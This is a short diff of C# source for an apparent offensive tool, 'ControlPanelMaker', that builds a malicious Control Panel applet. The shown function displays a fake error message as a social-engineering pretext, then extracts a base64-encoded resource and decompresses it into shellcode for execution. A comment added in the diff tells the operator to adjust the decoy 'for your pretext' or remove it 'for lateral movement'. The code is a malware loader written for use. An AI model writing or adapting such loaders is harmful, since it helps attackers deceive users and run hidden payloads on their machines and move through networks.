@@ -51,7 +51,9 @@ public class Test
     [DllExport("CPlApplet", CallingConvention = CallingConvention.StdCall)]
     public unsafe static IntPtr CPlApplet()
     {
+        // Change this for your pretext or comment out for lateral movement
         MessageBox.Show("Action Failed Error Number 2950");
+        
         string scode = ExtractResource("ControlPanelMaker.Resources.txt");
         byte[] blob = Convert.FromBase64String(scode);
         byte[] shellcode = Decompress(blob);
